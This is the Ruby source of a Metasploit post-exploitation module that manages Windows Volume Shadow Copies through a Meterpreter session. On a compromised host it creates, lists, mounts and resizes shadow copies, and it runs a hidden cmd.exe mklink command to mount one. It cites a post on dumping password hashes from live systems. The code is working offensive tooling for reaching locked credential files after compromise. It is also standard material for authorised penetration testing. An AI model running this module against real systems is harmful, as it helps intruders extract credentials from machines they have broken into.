##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::FileSystem
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::ShadowCopy

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Windows Manage Volume Shadow Copies",
      'Description'          => %q{
        This module will perform management actions for Volume Shadow Copies on the system. This is based on the VSSOwn
        Script originally posted by Tim Tomes and Mark Baggett.

        Works on win2k3 and later.
        },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'Author'               => ['theLightCosine'],
      'References'    => [
        [ 'URL', 'http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html' ]
      ],
      'Actions' => [
        [ 'VSS_CREATE', { 'Description' => 'Create a new VSS copy'} ],
        [ 'VSS_LIST_COPIES', { 'Description' => 'List VSS copies' } ],
        [ 'VSS_MOUNT', { 'Description' => 'Mount a VSS copy' } ],
        [ 'VSS_GET_INFO', { 'Description' => 'Get VSS information' } ],
        [ 'VSS_SET_MAX_STORAGE_SIZE', { 'Description' => 'Set the VSS maximum storage size' } ]
      ],
      'DefaultAction' => 'VSS_GET_INFO',
    ))

    register_options(
      [
        OptInt.new('SIZE', [ false, 'Size in bytes to set for max storage'], conditions: %w{ ACTION == VSS_SET_MAX_STORAGE_SIZE }),
        OptString.new('VOLUME', [ false, 'Volume to make a copy of.', 'C:\\'], conditions: %w{ ACTION == VSS_CREATE }),
        OptString.new('DEVICE', [ false, 'DeviceObject of shadow copy to mount.' ], conditions: %w{ ACTION == VSS_MOUNT }),
        OptString.new('PATH', [ false, 'Path to mount the shadow copy to.' ], conditions: %w{ ACTION == VSS_MOUNT })
      ])
  end


  def run
    # all conditional options are required when active, make sure none of them are blank
    options.each_pair do |name, option|
      next if option.conditions.empty?
      next unless Msf::OptCondition.show_option(self, option)
      fail_with(Failure::BadConfig, "The #{name} option is required by the #{action.name} action.") if datastore[name].blank?
    end

    fail_with(Failure::NoAccess, 'This module requires administrative privileges to run') unless is_admin?
    fail_with(Failure::NoAccess, 'This module requires UAC to be bypassed first') if is_uac_enabled?
    fail_with(Failure::Unknown, 'Failed to start the necessary VSS services') unless start_vss

    send("action_#{action.name.downcase}")
  end

  def action_vss_create
    if (id = create_shadowcopy(datastore['VOLUME']))
      print_good "Shadow Copy #{id} created!"
    end
  end

  def action_vss_get_info
    return unless (storage_data = vss_get_storage)

    tbl = Rex::Text::Table.new(
      'Header'  => 'Shadow Copy Storage Data',
      'Indent'  => 2,
      'Columns' => ['Field', 'Value']
    )
    storage_data.each_pair{|k,v| tbl << [k,v]}
    print_good(tbl.to_s)
    store_loot('host.shadowstorage', 'text/plain', session, tbl.to_s, 'shadowstorage.txt', 'Shadow Copy Storage Info')
  end

  def action_vss_mount
    print_status('Creating the symlink...')
    # todo: check if this can be replaced with create_symlink create_symlink(nil, datastore['PATH'], datastore['DEVICE'])
    session.sys.process.execute("cmd.exe /C mklink /D #{datastore['PATH']} #{datastore['DEVICE']}", nil, {'Hidden' => true})
  end

  def action_vss_list_copies
    shadow_copies = vss_list
    return if shadow_copies.empty?

    list = ''
    shadow_copies.each do |copy|
      tbl = Rex::Text::Table.new(
        'Header'  => 'Shadow Copy Data',
        'Indent'  => 2,
        'Columns' => ['Field', 'Value']
      )
      copy.each_pair{|k,v| tbl << [k,v]}
      list << " #{tbl.to_s} \n\n"
      print_good tbl.to_s
    end
    store_loot('host.shadowcopies', 'text/plain', session, list, 'shadowcopies.txt', 'Shadow Copy Info')
  end

  def action_vss_set_max_storage_size
    if vss_set_storage(datastore['SIZE'])
      print_good('Size updated successfully')
    else
      print_error('There was a problem updating the storage size')
    end
  end
end
